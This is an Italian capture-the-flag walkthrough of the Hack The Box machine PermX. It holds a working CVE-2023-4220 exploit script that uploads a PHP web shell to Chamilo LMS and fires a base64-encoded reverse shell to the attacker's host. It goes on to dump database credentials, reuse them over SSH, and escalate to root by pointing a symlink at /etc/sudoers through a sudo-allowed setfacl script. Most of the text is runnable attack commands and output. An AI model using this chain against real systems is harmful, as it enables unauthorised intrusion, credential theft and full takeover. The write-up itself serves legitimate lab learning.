---
title: PermX Walkthrough
description: PermX è una macchina Linux di difficoltà easy che presenta un sistema di gestione dell'apprendimento vulnerabile a upload di file senza limitazioni tramite CVE-2023-4220. Questa vulnerabilità viene sfruttata per ottenere un punto d'appoggio iniziale sulla macchina. L'enumerazione del sistema rivela credenziali che portano all'accesso SSH. Una errata configurazione di sudo viene quindi sfruttata per ottenere una shell di root.
author: dua2z3rr
date: 2025-11-01 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Web Application", "Area di Interesse: Common Applications", "Vulnerabilità: Arbitrary File Upload", "Codice: PHP", "Codice: Bash"]
image: /assets/img/permX/permX-resized.png
---

## Enumerazione Esterna

### NMAP

Cominciamo con nmap:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.23 -vv -p-
<SNIP>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

<SNIP>

┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $clear; nmap 10.10.11.23 -vv -p22,80 -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vediamo solo 2 porte aperte: la porta 22 (ssh) e la porta 80 (http). Vediamo che il dominio del sito è **permx.htb** e che sta girando **Apache httpd 2.4.52**.

### HTTP

Andiamo sul sito.

![Desktop View](/assets/img/permX/permX-1.png)

Esplorando il sito, non ho trovato nulla che mi rendirizzasse su altre pagine.

### FFUF

Procedo con il fuzzing delle directory.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $clear; ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt:FUZZ -u http://permx.htb/FUZZ -ic -recursion

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 47ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 47ms]
[INFO] Adding a new job to the queue: http://permx.htb/css/FUZZ

lib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 47ms]
[INFO] Adding a new job to the queue: http://permx.htb/lib/FUZZ

js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 48ms]
[INFO] Adding a new job to the queue: http://permx.htb/js/FUZZ

img                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 2108ms]
[INFO] Adding a new job to the queue: http://permx.htb/img/FUZZ

                        [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 60ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 43ms]
```

Non trovo nulla, quindi provo a fuzzare i subdomains.


```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://FUZZ.permx.htb -ic


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.permx.htb
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
```

Infine, provo i Vhost.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://permx.htb -H 'Host: FUZZ.permx.htb' -ic -mc all -fw 18


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 129ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1379ms]
:: Progress: [19964/19964] :: Job [1/1] :: 216 req/sec :: Duration: [0:01:33] :: Errors: 0 ::
```

Troviamo il virtual host **lms**. Aggiungiamo **lms.permx.htb** al file **/etc/hosts** e visitiamolo.

### lms Vhost

![Desktop View](/assets/img/permX/permX-2.png)

Ci troviamo davanti a una pagina di login di **Chamilo**.

> Chamilo is a free software e-learning and content management system, aimed at improving access to education and knowledge globally. Written in **PHP**

Dopo aver provato le classiche password di default, provo a cercare un exploit per bypassare la autenticazione.

### Ricerca Exploit

Faccio questa ricerca online: **Chamelo 1 auth vuln** e trovo la vulnerabilità **CVE-2023-4220**.

![Desktop View](/assets/img/permX/permX-3.png)

### Exploit

Modifichiamo l'exploit per ottenere una reverse shell.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $cat chamilo-exploit.sh
#!/bin/bash
HOST='http://lms.permx.htb'
CMD='echo "cG93ZXJzaGVsbCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzkwMDEgMD4mMQ==" | base64 -d | bash'

URL_UPLD='main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
URL_FILE='main/inc/lib/javascript/bigupload/files/rce.php'

cat <<'EOF'>/tmp/rce.php
<?php
$a=popen(base64_decode($_REQUEST["aoOoy"]),'r');while($b=fgets($a,2048)){echo $b;ob_flush();flush();}pclose($a);
?>
EOF

curl -F 'bigUploadFile=@/tmp/rce.php' "$HOST/$URL_UPLD"
CMD=$(echo $CMD|base64 -w0| python3 -c "import urllib.parse,sys; print(urllib.parse.quote_plus(sys.stdin.read()))")
curl "$HOST/$URL_FILE?aoOoy=$CMD"
```

Eseguiamo l'exploit dopo aver aperto il listener (`nc -lnvp 9001`):

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.23 55900
bash: cannot set terminal process group (1176): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

## Shell come www-data

### Credential Hunting

Utilizziamo il comando find per cercare file di configurazione nella root directory del sito.

```shell
www-data@permx:/var/www/chamilo$ find /var/www/chamilo -iname "*config*" -type f 2>/dev/null
<r/www/chamilo -iname "*config*" -type f 2>/dev/null
/var/www/chamilo/web.config
/var/www/chamilo/main/auth/shibboleth/config-dist.php
/var/www/chamilo/main/auth/shibboleth/lib/shibboleth_config.class.php
/var/www/chamilo/main/inc/lib/javascript/svgedit/config.js
/var/www/chamilo/main/inc/lib/javascript/svgedit/config-sample.js
/var/www/chamilo/main/inc/lib/javascript/svgedit/extensions/savefile_config.php
/var/www/chamilo/main/inc/lib/javascript/ckeditor/skins/bootstrapck/scss/config/_config.scss
<SNIP>
/var/www/chamilo/vendor/sonata-project/core-bundle/Resources/public/vendor/moment/src/lib/locale/base-config.js
/var/www/chamilo/vendor/sonata-project/core-bundle/Resources/public/vendor/bootstrap/grunt/configBridge.json
/var/www/chamilo/vendor/sonata-project/core-bundle/DependencyInjection/Configuration.php
/var/www/chamilo/vendor/sonata-project/datagrid-bundle/src/DependencyInjection/Configuration.php
/var/www/chamilo/vendor/sonata-project/block-bundle/src/DependencyInjection/Configuration.php
/var/www/chamilo/vendor/rmccue/requests/.editorconfig
/var/www/chamilo/vendor/michelf/php-markdown/.editorconfig
/var/www/chamilo/vendor/twig/twig/.editorconfig
/var/www/chamilo/vendor/swftools/swftools/docs/source/API/API/SwfTools/Configuration.html
/var/www/chamilo/vendor/swftools/swftools/sami_configuration.php
/var/www/chamilo/cli-config.php
```

Trovo il file **/var/www/chamilo/app/config/configuration.php** con all'interno le credenziali del database:

```php
www-data@permx:/var/www/chamilo/app/config$ cat configuration.php | grep db -n
<milo/app/config$ cat configuration.php | grep db -n
17:$_configuration['db_host'] = 'localhost';
18:$_configuration['db_port'] = '3306';
20:$_configuration['db_user'] = 'chamilo';
21:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
23:$_configuration['db_manager_enabled'] = false;
170:$_configuration['session_stored_in_db'] = false;
192:// If session_stored_in_db is false, an alternative session storage mechanism
197://$_configuration['session_stored_in_db_as_backup'] = true;
294://$_configuration['sync_db_with_schema'] = false;
716:// Show question feedback (requires DB change: "ALTER TABLE c_quiz_question ADD COLUMN feedback text;")
717://$_configuration['allow_quiz_question_feedback'] = false;
1477:// Allows to user add feedback (likes or dislikes) to posts in social wall. Requires DB changes:
1478:// CREATE TABLE message_feedback (id BIGINT AUTO_INCREMENT NOT NULL, message_id BIGINT NOT NULL, user_id INT NOT NULL, liked TINYINT(1) DEFAULT '0' NOT NULL, disliked TINYINT(1) DEFAULT '0' NOT NULL, updated_at DATETIME NOT NULL, INDEX IDX_DB0F8049537A1329 (message_id), INDEX IDX_DB0F8049A76ED395 (user_id), INDEX idx_message_feedback_uid_mid (message_id, user_id), PRIMARY KEY(id)) DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci ENGINE = InnoDB;
1479:// ALTER TABLE message_feedback ADD CONSTRAINT FK_DB0F8049537A1329 FOREIGN KEY (message_id) REFERENCES message (id) ON DELETE CASCADE;
1480:// ALTER TABLE message_feedback ADD CONSTRAINT FK_DB0F8049A76ED395 FOREIGN KEY (user_id) REFERENCES user (id) ON DELETE CASCADE;
1482:// - edit src/Chamilo/CoreBundle/Entity/MessageFeedback.php
1487://$_configuration['social_enable_messages_feedback'] = false;
2007:    'hide_feedback_textarea' => true,
```

### SSH

Scopriamo gli users sul sistema osservando le sotto cartelle della cartella **/home**

```shell
www-data@permx:/var/www/chamilo/app/config$ cd /home 
cd /home
www-data@permx:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root root 4096 Jan 20  2024 .
drwxr-xr-x 18 root root 4096 Jul  1  2024 ..
drwxr-x---  4 mtz  mtz  4096 Jun  6  2024 mtz
www-data@permx:/home$
```

Proviamo ad accedere all'account **mtz** con la password del database.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh mtz@permx.htb
The authenticity of host 'permx.htb (10.10.11.23)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'permx.htb' (ED25519) to the list of known hosts.
mtz@permx.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Nov  1 10:19:13 AM UTC 2025

  System load:  0.08              Processes:             239
  Usage of /:   59.4% of 7.19GB   Users logged in:       0
  Memory usage: 19%               IPv4 address for eth0: 10.10.11.23
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
mtz@permx:~$
```

Prendiamo la user flag.

## Shell come mtz

### Enumerazione Interna

Come ogni box, controlliamo se possiamo eseguire dei comandi o file come sudo.

```shell
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh

mtz@permx:~$ cd /opt ; ls -al | grep acl
-rwxr-xr-x  1 root root  419 Jun  5  2024 acl.sh
```

Possiamo eseguire questo script ma non scriverlo.

### Script

Ecco lo script che dobbiamo analizzare.

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

### Exploit

Per aggirare le misure di sicurezza (la flag -P non è utilizzata) possiamo usare i symlink.

```shell
mtz@permx:~$ ln -s /etc/sudoers root
mtz@permx:~$ ls -al
total 52
drwxr-x---  5 mtz  mtz  4096 Nov  1 13:12 .
drwxr-xr-x  3 root root 4096 Jan 20  2024 ..
lrwxrwxrwx  1 root root    9 Jan 20  2024 .bash_history -> /dev/null
-rw-r--r--  1 mtz  mtz   220 Jan  6  2022 .bash_logout
-rw-r--r--  1 mtz  mtz  3771 Jan  6  2022 .bashrc
drwx------  2 mtz  mtz  4096 May 31  2024 .cache
drwxrwxr-x  3 mtz  mtz  4096 Nov  1 12:49 .local
lrwxrwxrwx  1 root root    9 Jan 20  2024 .mysql_history -> /dev/null
-rw-r--r--  1 mtz  mtz   807 Jan  6  2022 .profile
drwx------  2 mtz  mtz  4096 Jan 20  2024 .ssh
-rw-rwxr--+ 1 mtz  mtz    84 Nov  1 12:43 ciao.sh
-rw-rwxr--+ 1 mtz  mtz    84 Nov  1 12:50 ciao2.sh
-rw-rwxr--+ 1 mtz  mtz    84 Nov  1 12:51 ciao3.sh
-rw-rw-r--  1 mtz  mtz    85 Nov  1 12:54 ciao4.sh
-rw-rw-r--  1 mtz  mtz     0 Nov  1 13:04 hey
lrwxrwxrwx  1 mtz  mtz    12 Nov  1 13:12 root -> /etc/sudoers
-rw-r-----  1 root mtz    33 Nov  1 08:51 user.txt
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/root
mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
mtz@permx:~$ sudo bash
root@permx:/home/mtz# whoami
root
root@permx:/home/mtz#
```

Prendiamo la root flag e terminiamo la box.
